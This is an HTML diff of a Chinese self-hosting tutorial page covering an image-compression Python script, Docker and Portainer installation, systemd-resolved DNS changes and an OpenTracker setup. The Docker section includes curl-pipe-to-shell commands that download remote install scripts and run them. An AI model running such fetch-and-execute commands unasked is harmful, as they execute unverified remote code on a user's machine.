+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="n">Image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">img&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 获取原图尺寸&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">img&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 计算压缩比例&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ratio&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">max_size&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getsize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 计算压缩后的尺寸&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">compressed_width&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">width&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">ratio&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">compressed_height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">height&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">ratio&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 压缩图片并保存&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">img&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">thumbnail&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">compressed_width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">compressed_height&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">img&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output_path&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 定义目标目录和最大文件大小&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">target_dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;pop&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">max_file_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">250&lt;/span> &lt;span class="c1"># 单位为 KB&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">dirs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">files&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">walk&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">target_dir&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">filename&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">files&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">input_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">output_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;compressed_&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">compress_image&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">max_file_size&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>图片后缀转换&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">PIL&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Image&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;./pop&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">filename&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">listdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.bmp&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">img_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="n">Image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">img_path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">im&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">im&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">convert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;RGB&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">splitext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">img_path&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="注意">注意：&lt;/h2>
 &lt;ol>
 &lt;li>
 &lt;p>建立名为&lt;code>backgroundDefault&lt;/code>的图片。必须&lt;code>JPG&lt;/code>格式的背景图片，保存到脚本所在的文件夹下。但文件大小必须控制在250KB以内，否则修改后的登录界面的背景图片就无法正常显示！&lt;/p>
@@ -981,10 +1156,24 @@ data-flex-basis="320px"
 &lt;h2 id="docker-安装">Docker 安装&lt;/h2>
 &lt;h3 id="使用官方安装脚本自动安装">使用官方安装脚本自动安装&lt;/h3>
 &lt;p>安装命令如下：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">curl -fsSL https://get.docker.com &lt;span class="p">|&lt;/span> bash -s docker
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>也可以使用国内 &lt;code>daocloud&lt;/code> 一键安装命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">curl -sSL https://get.daocloud.io/docker &lt;span class="p">|&lt;/span> sh
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="docker基本命令">Docker基本命令&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">curl -fsSL https://get.docker.com &lt;span class="p">|&lt;/span> bash -s docker
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>也可以使用国内 &lt;code>daocloud&lt;/code> 一键安装命令：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">curl -sSL https://get.daocloud.io/docker &lt;span class="p">|&lt;/span> sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="docker基本命令">Docker基本命令&lt;/h2>
 &lt;blockquote>
 &lt;p>Docker 镜像是由 Dockerfile 和一些必要的依赖项组成的，Docker 容器是动态的 Docker 镜像。要使用 Docker 命令，首先需要知道您是在处理镜像还是容器。一旦你知道你所处理的是镜像还是容器之后，你才可以找到正确的命令。&lt;/p>
 &lt;/blockquote>
@@ -1174,15 +1363,29 @@ fill="currentColor">
 &lt;/ol>
 &lt;h3 id="docker上安装portainer">Docker上安装Portainer&lt;/h3>
 &lt;p>&lt;strong>1、利用Docker拉取portainer镜像&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">docker pull portainer/portainer
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>3、运行启动portainer&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">docker pull portainer/portainer
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>3、运行启动portainer&lt;/strong>&lt;/p>
 &lt;blockquote>
 &lt;p>&lt;strong>温馨小提示&lt;/strong>： 这里需开放9000端口来映射portainer&lt;br>
 /var/run/docker.sock:/var/run/docker.sock -&amp;gt; 映射本地docker路径&lt;br>
 /home/docker/portainer:/data -&amp;gt; 实现数据持久化【原因：portainer的数据存储在容器内部的/data目录，容易导致容器重启的时候数据丢失，作用：将portainer数据映射到本地】&lt;/p>
 &lt;/blockquote>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">&lt;span class="n">docker&lt;/span> &lt;span class="n">run&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="n">9000&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="n">9000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">docker&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">sock&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">docker&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">sock&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">docker&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">portainer&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="n">data&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">name&lt;/span> &lt;span class="n">portainer&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">restart&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">always&lt;/span> &lt;span class="n">portainer&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">portainer&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>启动后通过 服务器地址:9000 即可访问portainer，第一次访问注意需要设置账号密码&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">docker&lt;/span> &lt;span class="n">run&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="n">9000&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="n">9000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">docker&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">sock&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">docker&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">sock&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">docker&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">portainer&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="n">data&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">name&lt;/span> &lt;span class="n">portainer&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">restart&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">always&lt;/span> &lt;span class="n">portainer&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">portainer&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>启动后通过 服务器地址:9000 即可访问portainer，第一次访问注意需要设置账号密码&lt;/p>
 &lt;h3 id="总结">总结&lt;/h3>
 &lt;ol>
 &lt;li>不同的环境安装可根据官网给出的文档进行操作&lt;/li>
@@ -1316,32 +1519,96 @@ mkdir /root/adguardhome/confdir
 &lt;p>最新版的 Chrome 已经支持使用 DoH 解析，在 Chrome 中找到「设置 - 安全 - 使用安全 DNS」，按规则填入域名即可&lt;/p>
 &lt;h2 id="linux-53-dns端口被-systemd-resolve-占用">Linux 53 DNS端口被 systemd-resolve 占用&lt;/h2>
 &lt;p>1.停用 systemd-resolved 服务&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">systemctl stop systemd-resolved
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编辑 &lt;code>/etc/systemd/resolved.conf&lt;/code> 文件&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">vi /etc/systemd/resolved.conf
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>换下面说明更改，然后按一下“esc”键，再输入“:wq”（不要输入引号），回车保存&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-INI" data-lang="INI">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">&lt;span class="k">[Resolve]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">2&lt;/span>&lt;span class="cl">&lt;span class="na">DNS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">8.8.8.8 #取消注释，增加dns&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">3&lt;/span>&lt;span class="cl">&lt;span class="c1">#FallbackDNS=&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">4&lt;/span>&lt;span class="cl">&lt;span class="c1">#Domains=&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">5&lt;/span>&lt;span class="cl">&lt;span class="c1">#LLMNR=no&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">6&lt;/span>&lt;span class="cl">&lt;span class="c1">#MulticastDNS=no&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">7&lt;/span>&lt;span class="cl">&lt;span class="c1">#DNSSEC=no&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">8&lt;/span>&lt;span class="cl">&lt;span class="c1">#Cache=yes&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">9&lt;/span>&lt;span class="cl">&lt;span class="na">DNSStubListener&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">no #取消注释，把yes改为no&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后输入下面命令即可&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="使用docker安装opentracker自建bt-tracker服务器">使用Docker安装OpenTracker，自建BT Tracker服务器&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">systemctl stop systemd-resolved
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>编辑 &lt;code>/etc/systemd/resolved.conf&lt;/code> 文件&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">vi /etc/systemd/resolved.conf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>换下面说明更改，然后按一下“esc”键，再输入“:wq”（不要输入引号），回车保存&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-INI" data-lang="INI">&lt;span class="line">&lt;span class="cl">&lt;span class="k">[Resolve]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">DNS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">8.8.8.8 #取消注释，增加dns&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#FallbackDNS=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#Domains=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#LLMNR=no&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#MulticastDNS=no&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#DNSSEC=no&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#Cache=yes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">DNSStubListener&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">no #取消注释，把yes改为no&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>最后输入下面命令即可&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="使用docker安装opentracker自建bt-tracker服务器">使用Docker安装OpenTracker，自建BT Tracker服务器&lt;/h2>
 &lt;p>OpenTracker用于搭建Tracker服务器，据说该工具性能很强，就连全球最大的BT服务器海盗湾也在使用，有人专门制作了一个OpenTracker的Docker镜像，基本不到1分钟就可以搭建好一个BT Tracker服务器，有兴趣的也可以玩玩。&lt;/p>
 &lt;h3 id="安装opentracker">安装OpenTracker&lt;/h3>
 &lt;h3 id="运行命令">运行命令：&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">docker run --name tracker-server -d -p 6666:6666 -p 6666:6666/udp moerats/tracker-server:latest
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果你服务器上的&lt;code>6666&lt;/code>端口正在被使用，而&lt;code>7777&lt;/code>没被使用，那就改成&lt;code>7777:6666&lt;/code>参数后再运行。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
